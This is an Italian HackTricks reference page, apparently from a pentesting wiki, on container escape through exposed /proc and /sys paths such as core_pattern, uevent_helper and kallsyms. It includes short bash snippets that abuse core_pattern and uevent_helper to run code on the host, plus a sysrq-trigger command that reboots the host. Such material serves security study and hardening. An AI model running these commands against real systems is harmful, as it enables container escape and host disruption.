<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>


L'esposizione di `/proc` e `/sys` senza un'adeguata isolamento dei namespace introduce significativi rischi per la sicurezza, tra cui l'aumento della superficie di attacco e la divulgazione di informazioni. Queste directory contengono file sensibili che, se configurati in modo errato o accessibili da un utente non autorizzato, possono portare all'escape del container, alla modifica dell'host o fornire informazioni utili per ulteriori attacchi. Ad esempio, il montaggio non corretto di `-v /proc:/host/proc` può bypassare la protezione di AppArmor a causa della sua natura basata sul percorso, lasciando `/host/proc` non protetto.

**Puoi trovare ulteriori dettagli su ciascuna potenziale vulnerabilità in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts).**

# Vulnerabilità di procfs

## `/proc/sys`
Questa directory consente l'accesso per modificare le variabili del kernel, di solito tramite `sysctl(2)`, e contiene diverse sottodirectory di interesse:

### **`/proc/sys/kernel/core_pattern`**
- Descritto in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Consente di definire un programma da eseguire durante la generazione del file core con i primi 128 byte come argomenti. Ciò può portare all'esecuzione del codice se il file inizia con una pipe `|`.
- **Esempio di test e di exploit**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Testa l'accesso in scrittura
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Imposta un gestore personalizzato
sleep 5 && ./crash & # Attiva il gestore
```

### **`/proc/sys/kernel/modprobe`**
- Descritto in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Contiene il percorso del caricatore del modulo del kernel, invocato per il caricamento dei moduli del kernel.
- **Esempio di controllo dell'accesso**:
```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Controlla l'accesso a modprobe
```

### **`/proc/sys/vm/panic_on_oom`**
- Citato in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Un flag globale che controlla se il kernel va in panic o invoca l'OOM killer quando si verifica una condizione OOM.

### **`/proc/sys/fs`**
- Come indicato in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contiene opzioni e informazioni sul file system.
- L'accesso in scrittura può consentire vari attacchi di negazione del servizio contro l'host.

### **`/proc/sys/fs/binfmt_misc`**
- Consente di registrare interpreti per formati binari non nativi in base al loro numero magico.
- Può portare a un'escalation dei privilegi o all'accesso alla shell di root se `/proc/sys/fs/binfmt_misc/register` è scrivibile.
- Exploit rilevante e spiegazione:
- [Rootkit da uomo povero tramite binfmt_misc](https://github.com/toffan/binfmt_misc)
- Tutorial approfondito: [Link al video](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

## Altri in `/proc`

### **`/proc/config.gz`**
- Può rivelare la configurazione del kernel se `CONFIG_IKCONFIG_PROC` è abilitato.
- Utile per gli attaccanti per identificare vulnerabilità nel kernel in esecuzione.

### **`/proc/sysrq-trigger`**
- Consente di invocare comandi Sysrq, causando potenzialmente riavvii immediati del sistema o altre azioni critiche.
- **Esempio di riavvio dell'host**:
```bash
echo b > /proc/sysrq-trigger # Riavvia l'host
```

### **`/proc/kmsg`**
- Espone i messaggi del buffer circolare del kernel.
- Può aiutare negli exploit del kernel, nelle falle di indirizzo e fornire informazioni sensibili sul sistema.

### **`/proc/kallsyms`**
- Elenca i simboli esportati dal kernel e i loro indirizzi.
- Fondamentale per lo sviluppo di exploit del kernel, soprattutto per superare KASLR.
- Le informazioni sugli indirizzi sono limitate con `kptr_restrict` impostato su `1` o `2`.
- Dettagli in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

### **`/proc/[pid]/mem`**
- Interagisce con il dispositivo di memoria del kernel `/dev/mem`.
- Storicamente vulnerabile agli attacchi di escalation dei privilegi.
- Maggiori informazioni su [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

### **`/proc/kcore`**
- Rappresenta la memoria fisica del sistema in formato core ELF.
- La lettura può rivelare il contenuto della memoria dell'host e di altri container.
- Le dimensioni del file possono causare problemi di lettura o crash del software.
- Utilizzo dettagliato in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

### **`/proc/kmem`**
- Interfaccia alternativa per `/dev/kmem`, che rappresenta la memoria virtuale del kernel.
- Consente la lettura e la scrittura, quindi la modifica diretta della memoria del kernel.

### **`/proc/mem`**
- Interfaccia alternativa per `/dev/mem`, che rappresenta la memoria fisica.
- Consente la lettura e la scrittura, la modifica di tutta la memoria richiede la risoluzione degli indirizzi virtuali in fisici.

### **`/proc/sched_debug`**
- Restituisce informazioni sulla pianificazione dei processi, bypassando le protezioni dello spazio dei nomi PID.
- Espone i nomi dei processi, gli ID e gli identificatori del cgroup.

### **`/proc/[pid]/mountinfo`**
- Fornisce informazioni sui punti di mount nel namespace di mount del processo.
- Espone la posizione del `rootfs` o dell'immagine del container.

## Vulnerabilità di `/sys`

### **`/sys/kernel/uevent_helper`**
- Utilizzato per gestire gli `uevent` dei dispositivi del kernel.
- La scrittura su `/sys/kernel/uevent_helper` può eseguire script arbitrari al verificarsi di `uevent` triggers.
- **Esempio di exploit**:
%%%bash
# Crea un payload
echo "#!/bin/sh" > /evil-helper
echo "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Trova il percorso dell'host dal mount OverlayFS per il container
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
# Imposta uevent_helper su un helper maligno
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Attiva un uevent
echo change > /sys/class/mem/null/uevent
# Legge l'output
cat /output
%%%
### **`/sys/class/thermal`**
- Controlla le impostazioni di temperatura, potenzialmente causando attacchi DoS o danni fisici.

### **`/sys/kernel/vmcoreinfo`**
- Rileva gli indirizzi del kernel, compromettendo potenzialmente KASLR.

### **`/sys/kernel/security`**
- Contiene l'interfaccia `securityfs`, che consente la configurazione dei moduli di sicurezza Linux come AppArmor.
- L'accesso potrebbe consentire a un contenitore di disabilitare il suo sistema MAC.

### **`/sys/firmware/efi/vars` e `/sys/firmware/efi/efivars`**
- Espone interfacce per interagire con le variabili EFI nella NVRAM.
- Una configurazione errata o un'exploit possono causare il blocco di laptop o l'impossibilità di avviare le macchine host.

### **`/sys/kernel/debug`**
- `debugfs` offre un'interfaccia di debug "senza regole" al kernel.
- Storia di problemi di sicurezza dovuti alla sua natura non limitata.


## Riferimenti
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
